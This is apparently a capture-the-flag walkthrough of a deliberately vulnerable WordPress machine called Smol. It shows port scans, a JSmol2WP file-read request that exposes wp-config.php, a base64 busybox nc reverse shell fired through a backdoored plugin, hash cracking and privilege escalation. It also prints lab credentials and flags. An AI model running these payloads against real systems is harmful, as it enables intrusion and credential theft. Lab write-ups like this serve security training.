"At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components."


Port scanning
```bash
nmap -p- --min-rate=5000 10.10.198.1
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 11:52 EEST
Nmap scan report for 10.10.198.1
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
                                                                                                           
┌──(root㉿kali)-[/home/kali]
└─# nmap -p 22,80 -sC -sV 10.10.198.1   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 11:53 EEST
Nmap scan report for 10.10.198.1
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7b:5e:9d:0b:71:bf:5a:f0:50:59:e6:be:45:f6:f7:bd (RSA)
|   256 8a:ef:77:ed:1e:ab:1e:d3:25:70:db:44:49:90:42:ff (ECDSA)
|_  256 0c:cd:a0:ed:46:92:2d:d8:fb:c9:3f:97:f5:17:8f:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.90 seconds
```

So there is SSH and a website

Its running wordpress and i decided to do some enumerating.
```bash
feroxbuster -u 'http://www.smol.thm/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

And since its running wordpress we can use wpscan to see if it has some vulnerabilities.

```bash
wpscan --url http://www.smol.thm --api-token 4oWrsm4dGZbUGnzaHaHahHAhak7za8cJXAZXeMak
```


```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://www.smol.thm --api-token 4oWrsm4dGZbUGnza1uI2RoD9Qsljk7za8cJXAZXeMak
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://www.smol.thm/ [10.10.198.1]
[+] Started: Sat Aug 30 13:36:46 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:09 <========================> (137 / 137) 100.00% Time: 00:00:09

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Sat Aug 30 13:37:07 2025
[+] Requests Done: 185
[+] Cached Requests: 5
[+] Data Sent: 45.521 KB
[+] Data Received: 14.057 MB
[+] Memory used: 253.391 MB
[+] Elapsed time: 00:00:21
```

The scan identified 2 vulnerabilites. XSS and SSRF. 

With the SSFR we are ablle to get some interesting information
```bash
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );


/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

A password and username 

wpuser:kbLSF2Vop#lw3rjDZ629*Z%G

We were able to log in as an admin. Now we can to try for example search for a way to get a RCE.

There is a "note" which has some tasks that should be done. We can use this to our advantage.

The #1 task is to check the source code of hello dolly which is a plugin on the site. we can check the source code with the same SSFR exploit that we used for the config.php file in the previous part

Basically the plugin allows for us to give an argument in base64 and it executes it

```bash
http://www.smol.thm/wp-admin/index.php?cmd=echo%20YnVzeWJveCBuYyAxMC42LjI1LjE1OSA0NDQ0IC1lIGJhc2g=%20|%20base64%20-d%20|%20bash
```
We got a shell
```bash
 nc -lvnp 4444      
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.198.1] 43266
id    
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I imported over linpeas to scan the machine. There is an sql where we can probably get some useful information.

I noticed that there is an SQL on the localhost and I was able to login with the same credentials that we were able to log into the website

```bash
www-data@ip-10-10-220-39:/var/www/wordpress/wp-admin$ mysql -u wpuser -h localhost -p
<wordpress/wp-admin$ mysql -u wpuser -h localhost -p  
Enter password: kbLSF2Vop#lw3rjDZ629*Z%G

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 30
Server version: 8.0.42-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```


There are multiple sha2 hashed passwords in there.
```bash
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |

```

lets crack them  with hashcat

```bash
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:sandiegocalifornia     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
Time.Started.....: Sat Aug 30 16:37:52 2025 (4 mins, 6 secs)
Time.Estimated...: Sat Aug 30 16:41:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5355 H/s (11.80ms) @ Accel:128 Loops:1024 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1316864/14344385 (9.18%)
Rejected.........: 0/1316864 (0.00%)
Restore.Point....: 1316352/14344385 (9.18%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7168-8192
Candidate.Engine.: Device Generator
Candidates.#1....: sandra1212 -> sanabi

Started: Sat Aug 30 16:37:51 2025
Stopped: Sat Aug 30 16:41:59 2025
```

We were able to crack the password succesfully. now we can get a better shell and gain new priviledges.

```bash
diego@ip-10-10-220-39:~$ cat user.txt
cat user.txt
45edaec653ff9ee06236b7ce72b86963
```


We can get an id_rsa key from the homedirectory of the user think

Now we can log in via SSH
```bash
ssh think@10.10.220.39 -i id_rsa 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 30 Aug 2025 01:51:34 PM UTC

  System load:  0.04              Processes:             134
  Usage of /:   69.0% of 9.75GB   Users logged in:       0
  Memory usage: 28%               IPv4 address for ens5: 10.10.220.39
  Swap usage:   0%

 * Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support on 31 Ma
 
   For more details see:
   https://ubuntu.com/20-04

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

37 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

think@ip-10-10-220-39:~$ 
```

There is an interesting zip file in the home of gege. We can't access it though.
For some reason gege had no pass so we were just able to log into his account. Wish I knew that before enumerating the machine for ages.

I tried to unzip it but requires a password.

I imported it over to my own machine and bruteforced for the password

```bash
python3 -m http.server 8000

wget <link>
```


```bash
┌──(kali㉿kali)-[~]
└─$ cat ziphash 
wordpress.old.zip:$pkzip$8*1*1*0*0*24*a31c*c2fb90b3964ce4863c047a66cc23c2468ea4fffe2124c38cb9c91659b31793de138ae891*1*0*0*24*a31c*7722f8032fb202c65e40d0d76a91cdfa948dc7e6857f209a06627320940fa5bcbb2603e6*1*0*0*24*a31c*592448eb70b5198cef005c60d3aeb3d78465376eaa5f465e1c2dd7c890d613102e284c88*1*0*0*24*a320*f87c1c69a82331ca288320268e6c556a6ddc31a03e519747bd7b811b6b837527c82abe0e*1*0*0*24*a320*dc42fd5700a7ab7a3353cc674906dec0d6b997d8d56cc90f1248d684df3382d4d8c3ea45*1*0*0*24*a320*c96021e04f0d8a5ce6f787365277b4c9966e228fe80a3d29bc67d14431ecbab621d9cb77*1*0*0*24*a320*35fe982e604f7d27fedd1406d97fc4e874ea7df806bda1fea74676d3510a698ec6a7a3ac*2*0*26*1a*8c9ae7e6*60ed*6c*0*26*a31c*7106504d46479d273327e56f5e3a9dd835ebf0bf28cc32c4cb9c0f2bb991b7acaaa97c9c3670*$/pkzip$::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-content/index.php, wordpress.old/wp-content/plugins/index.php, wordpress.old/wp-content/themes/index.php, wordpress.old/wp-includes/blocks/spacer/style.min.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.min.css, wordpress.old/wp-includes/blocks/spacer/style.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.css:wordpress.old.zip
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.old.zip)     
1g 0:00:00:00 DONE (2025-08-30 17:08) 2.083g/s 15889Kp/s 15889Kc/s 15889KC/s hesse..hepiboth
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now I have huge amounts of data to go through..

I just used commands to search for passwods and got lucky

```bash
gege@ip-10-10-220-39:~$ grep -R "DB_PASSWORD\|DB_USER" wordpress.old/
wordpress.old/wp-config.php:define( 'DB_USER', 'xavi' );
wordpress.old/wp-config.php:define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
wordpress.old/wp-includes/load.php:    $dbuser     = defined( 'DB_USER' ) ? DB_USER : '';
wordpress.old/wp-includes/load.php:    $dbpassword = defined( 'DB_PASSWORD' ) ? DB_PASSWORD : '';
wordpress.old/wp-admin/setup-config.php:        define( 'DB_USER', $uname );
wordpress.old/wp-admin/setup-config.php:        define( 'DB_PASSWORD', $pwd );
wordpress.old/wp-admin/setup-config.php:          case 'DB_USER':
wordpress.old/wp-admin/setup-config.php:          case 'DB_PASSWORD':
```

```bash
xavi@ip-10-10-220-39:/home/gege$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on ip-10-10-220-39:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on ip-10-10-220-39:
    (ALL : ALL) ALL
```

And xavi can run all commands as sudo so we can easily get the root flag.

```bash
xavi@ip-10-10-220-39:/home/gege$ sudo cat /root/root.txt
bf89ea3ea01992353aef1f576214d4e4
```


